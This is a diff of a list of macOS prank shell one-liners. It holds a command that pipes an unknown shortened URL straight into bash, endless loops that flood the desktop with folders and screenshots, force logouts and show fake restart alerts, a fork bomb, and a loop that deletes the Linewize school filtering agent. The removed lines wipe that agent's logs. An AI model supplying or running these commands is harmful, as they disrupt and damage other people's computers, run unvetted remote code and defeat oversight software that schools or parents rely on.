@@ -1,21 +1,28 @@
+••
 curl -sL bit.ly/sppccc | bash
 
-Trapped in screensaver:
+•• Trapped in screensaver:
 while true; do open -a ScreenSaverEngine; done
 
 Flashing White/Black Terminal Window
 while true; do printf '\e[?5h'; sleep 1; printf '\e[?5l'; sleep 1; done
 
-Fill trash with random folders:
-while true; do mkdir ~/.Trash/$RANDOM; done
+•• Desktop flooded with folders
+cd Desktop; n=0; while true; do mkdir "Trolled$((RANDOM % 1000000000))"; ((n++)); done
 
 Repeating alert sound:
 while true; do afplay /System/Library/Sounds/Glass.aiff; done
 
+Continuous Screen Capture
+while true; do screencapture -x ~/Desktop/screenshot-$((RANDOM % 1000000000)).png; done
+
+•• Infinite Folders Inside Folders
+cd Desktop; while true; do mkdir YouCantEmptyMe && cd YouCantEmptyMe; done
+
 Fake restart message:
 while true; do osascript -e 'tell application "System Events" to display dialog "System Restart Required. Please restart your computer." buttons {"Restart Now"} with icon caution'; done
 
-Stuck logged out:
+•• Stuck logged out:
 while true; do osascript -e 'tell application "System Events" to log out'; done
 
 Fake deleting files message
@@ -34,7 +41,7 @@ defaults write com.apple.dock persistent-apps -array-add '{"tile-type"="spacer-t
 Makes a 1gb File on the desktop
 mkfile 1g ~/Desktop/TROLLED
 
-Adds all applications to login items, a system restart after this will cause chaos:
+•• Adds all applications to login items, a system restart after this will cause chaos:
 for app in /Applications/*.app; do osascript -e "tell application \"System Events\" to make new login item at end with properties {path:\"$app\", hidden:false}"; done
 
 Random Volume Level:
@@ -54,42 +61,6 @@ open -na "Google Chrome" --args --new-tab "https://www.google.com/search?q=anime
 Bad Quality Rickroll:
 nc rya.nc 1987
 
-curl parrot.live
-
-curl wttr.in
-
-curl https://icanhazdadjoke.com
-
-ssh chat.shazow.net
-
-
-
-curl ascii.live/forrest
-
-curl https://poptart.spinda.net
-
-ssh sshtron.zachlatta.com
-
-	•	ssh sshtron.zachlatta.com ~> snake game; play with AWSD keys
-	•	ssh netris.rocketnine.space — multiplayer tetris
-	•	ssh play@ascii.town — 2048, snake, and freecell (source)
-	•	ssh gameroom@bitreich.org - 11 arcade games
-	•	ssh play@anonymine-demo.oskog97.com -p 2222 — guess free minesweeper; Pass: play
-	•	ssh twenex@sdf.org — play various games including checkers
-	•	ssh intricacy@sshgames.thegonz.net - Competitive puzzle; password: intricacy
-	•	ssh simulchess@sshgames.thegonz.net - Multiplayer Chess; password: simulchess
-	•	ssh pacman:pacman@antimirov.net - Pacman; password: pacman
-	•	ssh lagrogue@sshgames.thegonz.net - Roguelike; password: lag
-	•	ssh ckhet@sshgames.thegonz.net - Khet; password: ckhet
-	•	ssh slashem@slashem.me - nethack and others
-	•	ssh rodney@rlgallery.org - rogue; password: yendor
-	•	ssh pong.brk.st - singleplayer pong
-	•	ssh tty.sdf.org - requires you to make an account first
-	•	nc aardmud.org 23 — MUD (MUD list here, also works with telnet)
-	•	nc freechess.org 23 — Chess Game (also works with telnet)
-	•	nc igs.joyjoy.net 6969 - play/watch the game of Go (also works with telnet))
-	•	nc fibs.com 4321 - multiplayer backgammon (also works with telnet)
-
 Terminal Spinner:
 while true; do echo -ne "\r-  " && sleep 0.1 && echo -ne "\r\\  " && sleep 0.1 && echo -ne "\r|  " && sleep 0.1 && echo -ne "\r/  " && sleep 0.1; done
 
@@ -99,58 +70,8 @@ yes > /dev/null &
 Alternate Cascading Folders:
 while true; do mkdir "Trolled$$"; cd "Trolled$$"; done
 
-
 Destroy Linewize:
 while true; do find /Applications/FamilyZone -mindepth 1 -delete && sleep 5; done
-
-
-Remove saved Linewize Logs:
-setopt +o nomatch
-rm -f /Applications/FamilyZone/MobileZoneAgent/conf/properties.conf \
-      /Applications/FamilyZone/MobileZoneAgent/conf/signatures.cache \
-      /Applications/FamilyZone/MobileZoneAgent/conf/user.conf \
-      /Applications/FamilyZone/MobileZoneAgent/log/agent.log \
-      /Applications/FamilyZone/MobileZoneAgent/log/app.log \
-      /Applications/FamilyZone/MobileZoneAgent/log/app_control.log \
-      /Applications/FamilyZone/MobileZoneAgent/log/classroom.log \
-      /Applications/FamilyZone/MobileZoneAgent/log/dns_filter.log \
-      /Applications/FamilyZone/MobileZoneAgent/log/liveview_test.log \
-      /Applications/FamilyZone/MobileZoneAgent/log/reports_backup.log \
-      /Applications/FamilyZone/MobileZoneAgent/log/service.log \
-      /Applications/FamilyZone/MobileZoneAgent/log/service.panic.log \
-      /Applications/FamilyZone/MobileZoneAgent/log/keep_alive.log \
-      /Applications/FamilyZone/MobileZoneAgent/log/reports_backup.log \
-      /Applications/FamilyZone/MobileZoneAgent/log/traffic.log \
-      /Applications/FamilyZone/MobileZoneAgent/log/install.log \
-      /Applications/FamilyZone/MobileZoneAgent/log/*\.gz \
-      /Applications/FamilyZone/MobileZoneAgent/log/updater.log 2>/dev/null
-setopt -o nomatch
-
-
-Repeatedly remove saved Linewize Logs:
-while true; do
-    setopt +o nomatch
-    rm -f /Applications/FamilyZone/MobileZoneAgent/conf/properties.conf \
-        /Applications/FamilyZone/MobileZoneAgent/conf/signatures.cache \
-        /Applications/FamilyZone/MobileZoneAgent/conf/user.conf \
-        /Applications/FamilyZone/MobileZoneAgent/log/agent.log \
-        /Applications/FamilyZone/MobileZoneAgent/log/app.log \
-        /Applications/FamilyZone/MobileZoneAgent/log/app_control.log \
-        /Applications/FamilyZone/MobileZoneAgent/log/classroom.log \
-        /Applications/FamilyZone/MobileZoneAgent/log/dns_filter.log \
-        /Applications/FamilyZone/MobileZoneAgent/log/liveview_test.log \
-        /Applications/FamilyZone/MobileZoneAgent/log/reports_backup.log \
-        /Applications/FamilyZone/MobileZoneAgent/log/service.log \
-        /Applications/FamilyZone/MobileZoneAgent/log/service.panic.log \
-        /Applications/FamilyZone/MobileZoneAgent/log/keep_alive.log \
-        /Applications/FamilyZone/MobileZoneAgent/log/reports_backup.log \
-        /Applications/FamilyZone/MobileZoneAgent/log/traffic.log \
-        /Applications/FamilyZone/MobileZoneAgent/log/install.log \
-        /Applications/FamilyZone/MobileZoneAgent/log/*\.gz \
-        /Applications/FamilyZone/MobileZoneAgent/log/updater.log 2>/dev/null
-    setopt -o nomatch
-done
-
 
 Breaks Terminal:
 :(){:|:&};:
